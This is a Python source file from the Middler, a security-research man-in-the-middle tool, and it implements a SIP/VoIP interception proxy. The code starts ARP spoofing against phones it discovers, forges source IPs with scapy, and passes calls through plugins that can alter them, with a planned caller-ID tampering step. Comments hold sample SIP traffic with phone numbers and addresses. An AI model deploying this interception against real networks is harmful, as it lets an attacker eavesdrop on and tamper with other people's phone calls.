#!/usr/bin/env python

import libmiddler as ml
# Copyright 2009 Jay Beale
# Licensed under GPL v2

from socket import *
import os, signal, SocketServer, select, sys
import re, time
import threading, thread

from libmiddler.api.parse_uris import *

from scapy.all import *
#### Globals

# Process ID's for any processes we fork
child_pids_to_shutdown = []

########################################################################
# Header substrings
########################################################################

#
# Define substring matches to match client
# request request_headers against.
#

prefix = {}
len_prefix = {}

headers_to_capture_specificly = ( "To","From","Via","Contact","CSeq", "Call-ID", "Max-Forwards","Content-Length")
for headername in headers_to_capture_specificly :
    lowercase = headername.lower()
    prefix[lowercase] = headername

# Pre-compute the lengths of the prefix (substring matches) to speed parsing.
# While we're at it, let's create a tuple of the keys here so we can
# change the line matching routine later to loop over the available
# prefixes more quickly.

client_header_prefixes = tuple(prefix.keys())

for item in client_header_prefixes:
    len_prefix[item] = len(prefix[item])


########################################################################
# SIP Plug-ins
########################################################################

# Check sys.modules['middler']'s directory for a plugins/ directory.

SIP_PLUGINS = []
if (not SIP_PLUGINS or len(SIP_PLUGINS) == 0):

    ###### This code loads the fileparsers into the SIP_PLUGINS list
    parserdir = "%s%splugins%ssip"%(os.sep.join(sys.modules['libmiddler'].__file__.split(os.sep)[:-1]), os.sep, os.sep)
    #parserdir = "%s%splugins"%(os.sep.join(sys.modules['libmiddler'].__file__.split(os.sep)[:-1]), os.sep) + "/enabled"
    ml.jjlog.debug(">>plugindir: %s<<"%parserdir)

    filename = None
    for filename in  os.listdir(parserdir):
        try:
        # Add any file in the active plugins directory that ends in .py and doesn't
        # start with _ to our list of plugins.

            if (len(filename) > 3 and filename[0] != "_" and filename[-3:] == ".py"):
                SIP_PLUGINS.append(__import__("libmiddler.plugins.sip.%s"%filename[:-3], None, None, "libmiddler.plugins.sip"))
        except:
            ml.jjlog.debug("Error loading plugin %s"%filename)
            x,y,z = sys.exc_info()
            sys.excepthook(x,y,z)
            pass

# If we haven't found the plugins/ directory yet, check the current directory
# for a plugins/ directory.

if (not SIP_PLUGINS or len(SIP_PLUGINS) == 0):

    ###### This code loads the fileparsers into the SIP_PLUGINS list
    #ml.jjlog.debug( os.path.abspath(os.curdir)
    parserdir = "./plugins/sip"
    ml.jjlog.debug(">> Had to set plugin directory relative to current dir - plugindir: %s<<"%parserdir)
    filename = None
    try:
        for filename in  os.listdir(parserdir):
            try:
                if (len(filename) > 3 and filename[0] != "_" and filename[-3:] == ".py"):
                    SIP_PLUGINS.append(__import__("libmiddler.plugins.sip.%s"%filename[:-3], None, None, "libmiddler.plugins.sip"))
            except:
                ml.jjlog.debug("Error loading plugin %s"%filename)
                x,y,z = sys.exc_info()
                sys.excepthook(x,y,z)
                pass
    except OSError:
        pass

class PluginSaysDontSend(Exception):
    def __init__(self, headers, data):
        self.headers = headers
        self.data = headers

########################################################################
# SIP_Sessions class
########################################################################


    # Set up a sessions() data structure for tracking information about
    # each target user, indexed by IP address.

    #
    # The SIP_Session class is for storing information about a given
    # person/process that we learn while proxying one connection
    # so as to use that information while handling other connections.
    #
    # Among other things, this is where we keep note of someone's username
    # in an application.  When we get the GUI going, this is where we'll
    # track what actions we've cued for their user on their next session.
    #
    # The next step is to make HTTP_Sessions and SIP_Sessions both subclasses
    # of a Sessions class, allowing us to share data from all protocols.
    #
    # Note that we may have to consider the case where a user has multiple
    # SIP clients running on diff ports
    #

class SIP_Sessions(dict):

    # Constructor for the entire class.
    def __init__(self):
        dict.__init__(self)

    def getSession(self, source_ip):
        session = self.get(source_ip, None)
        if session == None:
            session = { 'source_ip' : source_ip }
            self[source_ip] = session
        return session


class ThreadedUDPServer(SocketServer.ThreadingMixIn, SocketServer.UDPServer):
    allow_reuse_address = True

class Middler_SIP_UDP_Proxy(SocketServer.DatagramRequestHandler):

    respond_via_address = {}
    udp_ports = []
    arpspoofing_targets = []
    sessions = SIP_Sessions

    def __init__(self, request, client_address, server):
        self.client_headers = {}

        # Let's store our IP address.
        (self.ip,self.port)  = server.server_address

        # Let's see if there is a session associated with this.
        #self.current_user = Middler_SIP_Proxy.SIP_Sessions.getSession(client_address)

        #ml.jjlog.debug( (request, client_address, server, dir(self))
        SocketServer.DatagramRequestHandler.__init__(self, request, client_address, server)


    ####################################################################################################
    # Plugin Architecture functions are found here - very important to understand                                            #
    ####################################################################################################

    # This function runs through all plugins that have subscribed, passing each
    # the request headers and data, receiving both back, possibly modified along
    # with notification as to whether the plugin changed anything and if the
    # plugin requires that no other plugin receive a chance to make changes
    # before we hand the data back to the user.

    def doRequest(self, session, request_headers, data):
        global SIP_PLUGINS
        for plugin in SIP_PLUGINS:
            try:
                ml.jjlog.debug("executing plugin %s" % plugin)
                request_headers, data, changed, stop = plugin.doRequest(session, request_headers, data, self)
                if stop:
                    break
            except PluginSaysDontSend, e:
                raise e
            except Exception, msg:
                print "ERROR in plugin %s: %s"%(repr(plugin), repr(msg))
        return (session, request_headers, data)


    ####################################################################################################
    # Main handler functions
    ####################################################################################################

    # TODO-High: Watch out in both this and HTTP proxy to make sure we're closing off all sockets.

    def map_via_to_sipuri(self,sip_uri,via_uri):

        # We need to make sure that every thread can determine what host to reach out to.

        # When you factor in NAT and the bidirectional nature of SIP, it gets harder.

        # For _requests_, the client (UAC) will use its Internet-routable current IP address in the
        # Contact line and its location-independent name (id@proxy.domain.com) in the From header.
        # We need the first Via line, if we want to be able to decide where to send the replies.
        # We can then map the Via line's destination host and port to the user's two sip URI's.

        # TODO-Medium: For speed, we should reverse the order, so we parse the SIP URI
        #              first, and don't parse the Via address unless we lack a record?


        # Here is what a Via header looks like:
        #
        # Via: SIP/2.0/UDP 192.168.0.50:64064;branch=some_string;rport
        #

        # Break via apart into the protocol version (SIP/2.0) and the rest, which
        # contains the client address and port, the branch parameter and any other options.

        sip_uri = sip_uri.rstrip("\r\n")
        via_uri = via_uri.rstrip("\r\n")
        print "map_via_to_sipuri entered with SIPURI = %s and VIA = %s" % (sip_uri,via_uri)
        protocolversion = ""
        internal_address_port_branch_options = ""
        try:
            (protocolversion,internal_address_port_branch_options) = via_uri.split(None)
        except:
            print ("ERROR: Via string did not contain at least one space:\n%s\n" % via_uri)
            self.finish()

        # Pull the IP address and port out.
        semicolon = find(internal_address_port_branch_options,";")
        if semicolon == -1:
            internal_address_port = internal_address_port_branch_options
            via_options = ""
        else:
            internal_address_port = internal_address_port_branch_options[:semicolon]
            via_options = internal_address_port_branch_options[semicolon+1:]

        # Now, separate the port number off an address if it is in IP:port notation
        colon = find(internal_address_port,":")

        # If we didn't find a :, end is -1.
        if colon != -1:
            internal_address = internal_address_port[0:colon]
            internal_port = int(internal_address_port[colon+1:])
        else:
            ml.jjlog.debug("Found no port in SIP URI %s\n" % internal_address_port)
            internal_address = internal_address_port
            internal_port = 5060

        print "DEBUG: VIA showed internal IP:port to be %s : %s" % (internal_address,internal_port)
        print "Connection itself is from %s : %d" % (self.source_ip,self.source_port)
        # Checked this code - it does it right with Vonage.
        #print "internal address from via line was %s,%s" % (internal_address,internal_port)

        # Now find the branch ID.  This is unique to the entire call.
        #for option in via_options:
        #    (key,value) = option.split("=")
        #    if key == "branch":
        #        self.branch_id = value
                # TODO-Low: record session for this source IP address, if it is on our internal network


        #
        # Now, we have the Sender's IP address.  Now map the sip_uri line named to it.
        #

        # Right now, this is almost certainly a Contact or From header.


        # Here is what a Contact header looks like.  The first is from Vonage, the second Gizmo.
        #
        # Contact: <sip:13015914091@192.168.0.253:5061;transport=UDP;user=phone>
        # Contact: <sip:17470848985@75.160.105.73:64064>

        # Here is what a From header looks like.  The first is from Vonage, the second Gizmo.
        #
        # From: "The Middler" <sip:12068837525@69.59.236.139:5060;pstn-params=808282808882>;tag=802356222
        # From: <sip:17470848915@proxy01.sipphone.com>;tag=c68b5a63

        # Checked this code - it does it right with Vonage.
        normalized_sip_uri = normalize_sip_uri(sip_uri)

        # Now make the mapping available to the entire Middler.
        Middler_SIP_UDP_Proxy.respond_via_address[normalized_sip_uri] = (internal_address,internal_port)

        # Now set up arpspoofing for this address if we haven't already.
        if internal_address not in Middler_SIP_UDP_Proxy.arpspoofing_targets:
            print 'DEBUG: need to start arpspoofing %s' % internal_address
            Middler_SIP_UDP_Proxy.arpspoofing_targets.append(internal_address)

            # fork off a process to arpspoof this one

            pid = os.fork()

            if pid:
                ml.jjlog.debug("Forking to handle arpspoofing via process %d\n" % pid)

                # Let's add this process to a list of child processes that we will need to
                # explicitly shut down.

                ml.child_pids_to_shutdown.append(pid)

            else:

                ml.traffic_capture.arpspoof_a_client(impersonated_host=internal_address)
                while True:
                    pass






    # handle() - handles one client connection intended for a SIP server.
    def handle(self):
        """Handles one client connection intended for a SIP proxy or client."""

        self.current_user = self.client_address[0]

        # Store the source IP and port for the one packet this thread will handle.
        self.source_ip = self.client_address[0]
        self.source_port = int(self.client_address[1])
        print 'src:', self.source_port, self.client_address[1]

        # Store the destination IP and port for our outgoing packet.
        # We don't know what the original dest was, because iptables/ipfw both don't
        # give this to us.

        self.dest_hostname = "" # var: desthostname stores the host we're trying to contact.
        self.dest_port = self.port

        # Make sure we're tracking the ports we're already listening on.
        if self.port not in Middler_SIP_UDP_Proxy.udp_ports:
            Middler_SIP_UDP_Proxy.udp_ports.append(self.port)

        print "\n\n---------START------------------------------------"
        ml.jjlog.debug("Started a new thread to handle connection from %s:%d on our port %d!" % (self.source_ip,self.source_port,self.dest_port))
        print "Started a new thread to handle connection from %s:%d on port %d!" % (self.source_ip,self.source_port,self.dest_port)

        ## var: client_headers{} stores relevant header values, to take effort off plug-in authors.
        #client_headers =    {}

        #
        # Store variables about things we want to modify:
        #


        inject_status_code = 0    # var: inject_status_code - should we inject a new status code on next request?

        status_code_to_inject = ""

        # Location we'd like to inject, with 301 (permanent) or 307 (temporary)
        #location_to_inject = ""


        # Content-Length handling - if we modify POST data, we need to recalculate the content length.
        # var: recalculate_content_length - Track whether we need to recalculate the content length.
        # TODO: Should we track the current content_length offset with each change?
        recalculate_content_length = 0
        suppress_content_length = 1

        ###########################################################################
        # Parse SIP request headers
        ###########################################################################

        # Start by parsing the client headers until we hit a blank line signaling
        # that those headers are over.

        #
        # The following examples may help debugging:
        #

        #REGISTER sip:p.voncp.com:10000 SIP/2.0
        #From: "301-591-4091"<sip:13015914091@p.voncp.com:10000;user=phone>;tag=c0a800fd-13c5-4a1159fc-71ee-2fc2
        #To: <sip:13015914091@p.voncp.com:10000;user=phone>
        #Call-ID: 9451ce2c-8604-1242651132-1750-128603417300868100000000-1@192.168.0.253
        #CSeq: 1 REGISTER
        #Via: SIP/2.0/UDP 192.168.0.253:5061;branch=z9hG4bK-4a1159fc-71ee-21d3
        #User-Agent: <Motorola VT1000 mac: 00111A521F42 sw:VT20_02.03.00_A ln:1 cfg:1242651125769/1002286009>
        #Max-Forwards: 70
        #Supported: replaces
        #Contact: <sip:13015914091@192.168.0.253:5061;transport=UDP;user=phone>
        #Expires: 900
        #Content-Length: 0
        #
        #
        #SIP/2.0 401 Unauthorized
        #Via: SIP/2.0/UDP 192.168.0.253:5061;branch=z9hG4bK-4a1159fc-71ee-21d3
        #From: "301-591-4091" <sip:13015914091@p.voncp.com:10000;user=phone>;tag=c0a800fd-13c5-4a1159fc-71ee-2fc2
        #To: <sip:13015914091@p.voncp.com:10000;user=phone>
        #Call-ID: 9451ce2c-8604-1242651132-1750-128603417300868100000000-1@192.168.0.253
        #CSeq: 1 REGISTER
        #Contact: <sip:13015914091@192.168.0.253:5061;transport=UDP;user=phone>
        #WWW-Authenticate: Digest realm="216.115.30.30", domain="sip:216.115.30.30", nonce="8274305", algorithm=MD5
        #Max-Forwards: 70
        #Content-Length: 0



        # SIP over UDP is a stateless protocol.
        #
        # We're handling either the request or the reply.  Both sides of the
        # communication act like both a client and a server.  The request is
        # sent by the User Agent Client (UAC) while the response is sent by
        # the User Agent Server (UAS).  The two hosts will switch these roles
        # constantly.
        #
        # We know if this is a request or response by examining the first line
        # we get from the socket.  If this is a request, it will have a METHOD
        # line, like in the first example above, the INVITE.  If this is a
        # response, it will have a STATUS line, like in the second example.

        # One challenge is to determine where the UDP packet should go, since
        # the MitM method we use drops the destination IP.

        # For requests, the METHOD line contains the UAS's sipuri, but this
        # may not account for NAT.  We can account for NAT by storing the IP
        # address and port from each REGISTER request's first Via line in a
        # table referenced by the sipuri found on that REGISTER request's From
        # line.

        # For responses, look at the Via header.  In every
        # case, it tells the recipient how to get a packet on to the next hop.
        # The only challenge seems to be that the Via header can occur multiple
        # times in a packet.  The key is to get the first one!

        self.message_type = ""
        self.found_via = 0
        self.found_contact = 0
        self.found_from = 0
        self.destination_local = 0
        self.is_response = 0
        self.is_request = 0
        self.found_via = 0
        self.found_contact = 0
        self.found_from = 0

        # Get the METHOD line from a request or the STATUS line from a response.
        try:
            line = self.rfile.readline()
        except:
            print "ERROR: first readline() on the request failed!\n"
            self.finish()

        #
        # Figure out whether we're handling a response or a request.
        #

        # If it's a response, grab the status code.

        # We'll have to get the destination and port from the client's Registration.
        # When we parse the registration, we'll define a mapping between the IP address and port
        # on the Via line (internal NAT'd address) with the account/phone number and IP address
        # listed on the Contact line and the account/phone number and IP address listed on the
        # From line.

        # If it's a request, grab the method, as well as the destination hostname and port.

        line = line.rstrip("\r\n")
        print "Looking at a line that reads %s" % line
        #print "Request last line[-7:] is %s" % line[-7:]
        if line[-7:] == "SIP/2.0":
            self.is_request = 1
            (self.method,self.request_uri,self.proto_ver) = line.split(None,3)
            #print "DEBUG: processing request %s %s" % (self.method,self.request_uri)
        # If it's a response, we can at least grab the status code.
        elif line[0:7] == "SIP/2.0":
            self.is_response = 1
            self.status_code = line[8:11]
            print "DEBUG: processing response with status code %s\n" % self.status_code

        # There are packets whose entire payload is 0x0d0x0a0x0d0x0d.
        # These are STUN-related keep-alive packets, used to keep a NAT
        # rule from expiring.

        elif (line == "" or line[0] == 0x0d):

            # Right now, we can't forward these along as we rely on
            # header data to know where to send it.

            # Maybe we can create an iptables/ipfw rule that only redirects
            # packets to us that are big enough...

            print "DEBUG: this was a stun packet.  :()"

            self.is_stun_related = 1
            #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            out = "\r\n\r\n"
            self.dest_hostname = "stun01.sipphone.com"
            stun_packet=IP(src=self.source_ip,dst=self.dest_hostname)/UDP(sport=self.source_port,dport=self.port)/out
                #send(spoof_packet)
            send(stun_packet)
            #s.sendto(out,(self.dest_hostname,self.port))
            #s.close()
            print "DEBUG: Sent out a stun packet."
            while True:
                i=0

            print "Should not get here!"
            # TODO: figure out how/whether to port this along.
        else:
            print "First line was %s" % line

        # Store this header and grab the rest.  We understand that this might be a
        # response, rather than a request, but we can use much of the same code, so
        # we call this request_headers...

        print "SIP Method line:\n%s\n" % line
        request_headers = [ ("Request","%s\r\n" % line) ]

        try:
            while True:
                line = self.rfile.readline()
                if line in ("\r\n" ,"\n"):
                    break
                header, value = line.split(": ",1)
                request_headers.append((header,value))

                #print "DEBUG: %s: %s" % (header,value.rstrip("\r\n"))
                ml.jjlog.debug("done reading request_headers!\n")
        except:
            ml.jjlog.debug("Probably just finished reading request header")

        # Now look at the request_headers before looking at any data after the newline.

        length = len(request_headers)
        index = 1
        while index < length:

            # Store each header (lvalue,rvalue) tuple as an item in the ordered header list.
            header, value = request_headers[index]

            # Check for specific important headers.

            if header == prefix["via"]:

                # If we have already found one Via line, don't store this one.
                if self.found_via == 0:

                    self.client_headers["via"] = value

                    print "DEBUG: found via header! %s" % value.rstrip("\r\n")

                    self.found_via = 1
                    if self.found_contact and self.is_request:
                        # We have both a Via and a Contact line.
                        self.map_via_to_sipuri(self.client_headers["contact"],value)
                    if self.found_from and self.is_request:
                        self.map_via_to_sipuri(self.client_headers["from"],value)


            elif header == prefix["to"]:

                # If we're in a call, this gives us the call's destination
                # (the next proxy or the receiver) but this is also in the method.
                #
                # NOTE: This destination is only the packet's destination if it's from the side that
                #       originated the call.

                # Here's what a To header looks like, on Gizmo and Vonage:
                #
                # To: <sip:+12065557526@proxy01.sipphone.com>
                # To: <sip:13015554091@216.115.20.24:5060>

                self.client_headers["to"] = value
                print "DEBUG: found to header! %s" % value.rstrip("\r\n")
                # If this is an invite request, let's parse the SIP URI to get both the phone
                # number dialed, if we can determine that this is going to a POTS phone, and
                # the host being contacted.

                    # Now use our parsing routine!
                    # (self.to_sip_id,self.to_sip_host,self.to_sip_uri) = parse_sip_uri(sip_uri_substring)

            elif header == prefix["from"]:

                #
                # Here's a From header from Vonage and Gizmo
                #
                # From: "301-591-4091"<sip:13015914091@p.voncp.com:10000;user=phone>;tag=c0a800fd-13c5-4a1159fc-71ee-2fc2
                # From: <sip:17470848985@proxy01.sipphone.com>;tag=c68b5a63
                #

                print "DEBUG: found from header: %s" % value.rstrip("\r\n")
                self.client_headers["from"] = value

                # Log this From sipuri with the SIPURI->IP:Port mapping, so we can handle returned
                # packets and incoming requests.

                self.found_from = 1
                if self.found_via and self.is_request:
                    # We have both a Via and a From line.
                    self.map_via_to_sipuri(value,self.client_headers["via"])

                # TODO-High: Modify incoming caller ID by tweaking From lines on INVITE's.

            elif header == prefix["contact"]:

                # Store the contact header now.
                self.client_headers["contact"] = value

                self.found_contact = 1
                if self.found_via:
                    # We have both a Via and a Contact line.
                    self.map_via_to_sipuri(value,self.client_headers["via"])

            elif header == prefix["cseq"]:
                self.client_headers["cseq"] = value
            elif header == prefix["call-id"]:
                self.client_headers["call-id"] = value
            elif header == prefix["max-forwards"]:
                self.client_headers["max-forwards"] = value
            elif header == prefix["content-length"]:
                self.client_headers["content-length"] = value

            index += 1

        request_data = ""
        # Now, grab the rest of the data.
        if "content-length" in self.client_headers:
            request_data = self.rfile.read(int(self.client_headers["content-length"]))

            print "\nDEBUG: Content length was %d\n" % int(self.client_headers["content-length"])
            if request_data != "":
                print "DEBUG: Request data follows:\n%s" % request_data

        # Run the plug-ins on the request.
        self.current_user, request_headers, request_data = self.doRequest(self.current_user, request_headers, request_data)
        ml.jjlog.developer_log("returned from doRequest")

        ###########################################################################
        # Send request and parse SIP response headers
        ###########################################################################

        #response_to_send_to_client=""
        #server_headers = {}
        modified_request = ""
        modified_headers = []

        # Let's build the request.

        # Build the packet from the headers, realizing that they may have been modified.

        modified_request = request_headers[0][1]

        for header in request_headers[1:]:
            lvalue = header[0]
            rvalue = header[1]
            #print ("%s: %s" % (lvalue,rvalue[0:-1]) )

            #if lvalue == "Via":
            #    middlers_via_line = "SIP/2.0/UDP %s:%s;branch=middler-3d3g5lt-Kh50\r\n" % ("208.64.241.83",self.source_port)
            #    modified_request = "%s%s: %s" % (modified_request,"Via",middlers_via_line)

            modified_request = "%s%s: %s" % (modified_request,lvalue,rvalue)

        print "\nModified headers:\n%s\n" % modified_request

        # Now build and send a packet.

        if request_data != "":
            modified_request = "%s\r\n%s" % (modified_request,request_data)

        #
        # Now determine where this packet is going!
        #


            # RFC 3261 - Section 16.12
            #
            #1.  The proxy will inspect the Request-URI.  If it indicates a
            #    resource owned by this proxy, the proxy will replace it with
            #    the results of running a location service.  Otherwise, the
            #    proxy will not change the Request-URI.
            #
            #2.  The proxy will inspect the URI in the topmost Route header
            #    field value.  If it indicates this proxy, the proxy removes it
            #    from the Route header field (this route node has been
            #    reached).
            #
            #3.  The proxy will forward the request to the resource indicated
            #    by the URI in the topmost Route header field value or in the
            #    Request-URI if no Route header field is present.  The proxy
            #    determines the address, port and transport to use when
            #    forwarding the request by applying the procedures in [4] to
            #    that URI.

        # Start by looking up the sipuri the packet is destined for.
        # For requests, get the sipuri out of the method line.
        # For responses, get the sipuri out of the From line.

        self.dest_uri = ""
        if self.is_request:
            # For a request, we'll send the packet to the host and port listed in the
            # method line's sipuri.  Note that this URI is already normalized, that is, it
            # already looks like:   sip:ACCOUNT@SERVER.

            self.dest_uri = self.request_uri

        elif self.is_response:
            #for key in self.client_headers:
            #    print "DEBUG-CRASH: client_headers [ %s ] = %s" % (key,self.client_headers[key])

            self.dest_uri = normalize_sip_uri(self.client_headers["from"])
        else:
            #print "Already sent! This was STUN?"
            exit

        # Now, let's see if that URI is in our Respond-via-address table.
        # If not, as would be the case with a registration, use the URI's info.

        print "DEBUG: destination URI is %s" % self.dest_uri
        #print "Maybe we need to track which IP:Port we spoke to last and talk to that one."
        if self.is_response:
            print "DEBUG: have a good time."

            if self.dest_uri in Middler_SIP_UDP_Proxy.respond_via_address:

                (self.dest_hostname,bad_dest_port) = Middler_SIP_UDP_Proxy.respond_via_address[self.dest_uri]
                print "DEBUG: Found dest in respond_via_address table - %s : %d" % (self.dest_hostname,self.dest_port)

        else:
            print "DEBUG: %s wasn't in our SIP URI -> IP:Port table." % self.dest_uri
            # First, if there's a sip:, get past it.
            post_sip_pos = find(self.dest_uri,"sip:")
            if post_sip_pos == -1:
                post_sip = self.dest_uri
            else:
                post_sip = self.dest_uri[post_sip_pos+4:]
                print "Stripped off sip: to get %s" % post_sip

            hostname_start = find(post_sip,"@")+1
            colon_location = find(post_sip,":",hostname_start)
            if hostname_start == -1:
                print "Can't find hostname in %s" % self.dest_sipuri
                self.finish()
            if colon_location == -1:
                self.dest_hostname = post_sip[hostname_start:]
                # Strip off any ;nat=true
                if ';' in self.dest_hostname:
                    self.dest_hostname = self.dest_hostname[:self.dest_hostname.find(';')]
                print "DEBUG: Parsed destination hostname - it was %s" % (self.dest_hostname )
            else:
                self.dest_hostname = post_sip[hostname_start:colon_location]
                # To parse port, we need to strip any ;nat=true off the end.
                tmp_port = post_sip[colon_location+1:]
                if ';' in tmp_port:
                    tmp_port = tmp_port[:tmp_port.find(';')]
                self.dest_port = int(tmp_port)
                print "DEBUG: Parsed destination hostname from method line - it was %s (%s) - reaching it on port %d" % (self.dest_hostname,gethostbyname(self.dest_hostname),self.dest_port)


        # Now make sure that we're listening on that port!
        if self.dest_port not in Middler_SIP_UDP_Proxy.udp_ports:
            Middler_SIP_UDP_Proxy.udp_ports.append(self.dest_port)
            # Signal somehow that we should launch another proxy?
            ml.jjlog.developer_log("SIP - Note - we haven't implemented dynamically adding ports.")
            print "We'd better start listening on port %d" % self.dest_port

        # For a response, we'll send the packet to the IP address

        #print "Sending modified request %s" % modified_request

        try:
            #ml.jjlog.debug("Connecting SIP to: %s:%d" % (self.dest_hostname,self.dest_port))

            if self.is_request or self.is_response:


            #s = socket(AF_INET, SOCK_DGRAM)
            #s.bind(self.ip,self.source_port)

            #print "DEBUG: Created new socket - trying to reach %s : %d" % (self.dest_hostname,self.dest_port)
            #s.sendto(modified_request,(self.dest_hostname,self.dest_port))
            #s.close()
            #print "DEBUG: Sent message successfully!"

                print "Running scapy - IP from %s to %s , sport %d , dport %d" %  ( self.source_ip,self.dest_hostname,self.source_port,self.dest_port)
                conf.verb=0
                spoof_packet=IP(src=self.source_ip,dst=self.dest_hostname)/UDP(sport=self.source_port,dport=self.dest_port)/modified_request
                #send(spoof_packet)
                receive=sr1(spoof_packet)
                receive.display()
                print "Response\n%s" % receive.load

        #except:
        #    ml.jjlog.debug("Connection failed to host %s" % self.dest_hostname)
        #    print "DEBUG: Connection failed to host %s" % self.dest_hostname

        finally:
            print "------Thread from port %d out!-----" % self.dest_port
            self.finish()
            #ml.jjlog.debug("Just sent modified request: \n%s" % modified_request)
            #ml.jjlog.debug("Just sent modified request:\n%s" % modified_request)

        # Now we will get the response in a different thread.
        #
        # The response will look like this:
        #
        # "This response contains the same To, From, Call-ID, CSeq and branch parameter in the Via as the INVITE, which allows Alice's
        # softphone to correlate this response to the sent INVITE.  "



    def finish(self):
        # Just in case we forgot to close off the sockets?
        # Let's see if we get errors.
        #ml.jjlog.debug("Made it into SocketServer.finish!\n")

        #self.wfile.close()
        #self.rfile.close()
        pass